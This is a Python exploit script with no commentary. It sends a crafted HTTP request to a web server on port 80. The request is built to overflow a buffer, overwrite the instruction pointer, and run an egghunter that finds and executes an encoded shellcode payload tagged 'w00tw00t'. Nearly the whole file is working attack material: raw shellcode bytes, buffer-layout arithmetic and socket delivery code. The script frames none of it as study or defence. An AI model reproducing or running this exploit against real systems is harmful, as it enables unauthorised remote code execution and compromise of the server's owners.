#!/usr/bin/python                                                                                                                                

import socket
import time

host = "your ip"
port = 80

jump ="\xb0\x02\x3c\x01\x7f\x16" 
eip = "\x9c\x11\x42"             


egghunter =  b""
egghunter += b"\x66\x81\xca\xff\x0f\x42\x52\x6a\x02\x58\xcd\x2e\x3c"
egghunter += b"\x05\x5a\x74\xef\xb8\x77\x30\x30\x74\x89\xd7\xaf\x75"
egghunter += b"\xea\xaf\x75\xe7\xff\xe7"


buf =  b""
buf += b"\xbe\x7d\x93\xbb\x53\xdd\xc5\xd9\x74\x24\xf4\x5a"
buf += b"\x33\xc9\xb1\x52\x83\xc2\x04\x31\x72\x0e\x03\x0f"
buf += b"\x9d\x59\xa6\x13\x49\x1f\x49\xeb\x8a\x40\xc3\x0e"
buf += b"\xbb\x40\xb7\x5b\xec\x70\xb3\x09\x01\xfa\x91\xb9"
buf += b"\x92\x8e\x3d\xce\x13\x24\x18\xe1\xa4\x15\x58\x60"
buf += b"\x27\x64\x8d\x42\x16\xa7\xc0\x83\x5f\xda\x29\xd1"
buf += b"\x08\x90\x9c\xc5\x3d\xec\x1c\x6e\x0d\xe0\x24\x93"
buf += b"\xc6\x03\x04\x02\x5c\x5a\x86\xa5\xb1\xd6\x8f\xbd"
buf += b"\xd6\xd3\x46\x36\x2c\xaf\x58\x9e\x7c\x50\xf6\xdf"
buf += b"\xb0\xa3\x06\x18\x76\x5c\x7d\x50\x84\xe1\x86\xa7"
buf += b"\xf6\x3d\x02\x33\x50\xb5\xb4\x9f\x60\x1a\x22\x54"
buf += b"\x6e\xd7\x20\x32\x73\xe6\xe5\x49\x8f\x63\x08\x9d"
buf += b"\x19\x37\x2f\x39\x41\xe3\x4e\x18\x2f\x42\x6e\x7a"
buf += b"\x90\x3b\xca\xf1\x3d\x2f\x67\x58\x2a\x9c\x4a\x62"
buf += b"\xaa\x8a\xdd\x11\x98\x15\x76\xbd\x90\xde\x50\x3a"
buf += b"\xd6\xf4\x25\xd4\x29\xf7\x55\xfd\xed\xa3\x05\x95"
buf += b"\xc4\xcb\xcd\x65\xe8\x19\x41\x35\x46\xf2\x22\xe5"
buf += b"\x26\xa2\xca\xef\xa8\x9d\xeb\x10\x63\xb6\x86\xeb"
buf += b"\xe4\x79\xfe\xe9\x74\x11\xfd\x0d\x64\xbe\x88\xeb"
buf += b"\xec\x2e\xdd\xa4\x98\xd7\x44\x3e\x38\x17\x53\x3b"
buf += b"\x7a\x93\x50\xbc\x35\x54\x1c\xae\xa2\x94\x6b\x8c"
buf += b"\x65\xaa\x41\xb8\xea\x39\x0e\x38\x64\x22\x99\x6f"
buf += b"\x21\x94\xd0\xe5\xdf\x8f\x4a\x1b\x22\x49\xb4\x9f"
buf += b"\xf9\xaa\x3b\x1e\x8f\x97\x1f\x30\x49\x17\x24\x64"
buf += b"\x05\x4e\xf2\xd2\xe3\x38\xb4\x8c\xbd\x97\x1e\x58"
buf += b"\x3b\xd4\xa0\x1e\x44\x31\x57\xfe\xf5\xec\x2e\x01"
buf += b"\x39\x79\xa7\x7a\x27\x19\x48\x51\xe3\x29\x03\xfb"
buf += b"\x42\xa2\xca\x6e\xd7\xaf\xec\x45\x14\xd6\x6e\x6f"
buf += b"\xe5\x2d\x6e\x1a\xe0\x6a\x28\xf7\x98\xe3\xdd\xf7"
buf += b"\x0f\x03\xf4"


buffer = jump + " /%" + "\x43" * 10 + egghunter + "\x43" * (276 - 10 - len(jump) - len(eip) - 1 - len(egghunter)) + eip + " HTTP/1.1\r\n"
buffer += "Connection: close\r\n\r\n" + "w00tw00t"  + buf

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host,port))
s.send(buffer)
s.close()

print("[+] Payload sent")